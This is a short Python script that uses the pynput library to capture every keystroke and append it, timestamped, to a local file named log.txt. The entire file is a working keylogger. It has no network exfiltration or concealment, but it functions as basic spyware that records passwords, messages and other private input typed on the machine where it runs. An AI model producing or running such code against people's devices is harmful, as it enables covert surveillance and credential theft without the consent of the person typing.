from pynput.keyboard import Key, Listener
import logging, sys

with open("log.txt", "a") as a:
    a.write("\n")

logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format="%(asctime)s - %(message)s")

def onpress(key):
    logging.info(str(key))
    # print(key)

with Listener(on_press=onpress) as listener:
    listener.join()